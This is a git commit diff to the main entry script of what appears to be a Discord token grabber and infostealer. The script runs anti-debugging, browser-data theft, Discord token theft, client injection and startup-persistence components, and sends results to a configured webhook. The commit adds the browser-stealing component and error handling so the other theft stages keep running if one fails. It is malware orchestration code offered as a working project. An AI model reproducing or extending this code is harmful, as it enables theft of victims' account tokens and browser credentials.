c2be72b33177e5c25d973fe01f7226c2141fecc2
SkeptralHIDDENLFML1 <122535356+SkeptralHIDDENLFML1@users.noreply.github.com>
2023-03-15 22:02:27 +0300

    Update main.py

--- src/main.py
+++ src/main.py
@@ -1,4 +1,5 @@
 from components.antidebug import AntiDebug
+from components.browsers import Browsers
 from components.discordtoken import DiscordToken
 from components.injection import Injection
 from components.startup import Startup
@@ -9,6 +10,7 @@ from config import __CONFIG__
 def main():
     funcs = [
         AntiDebug,
+        Browsers,
         DiscordToken,
         Injection,
         Startup,
@@ -17,10 +19,15 @@ def main():
 
     for func in funcs:
         if __CONFIG__[func.__name__.lower()]:
-            if func.__init__.__code__.co_argcount == 2:
-                func(__CONFIG__['webhook'])
-            else:
-                func()
+            try:
+                if func.__init__.__code__.co_argcount == 2:
+                    func(__CONFIG__['webhook'])
+                else:
+                    func()
+
+            except Exception as e:
+                print(f'Error in {func.__name__}: {e}')
+
 
 if __name__ == '__main__':
     main()
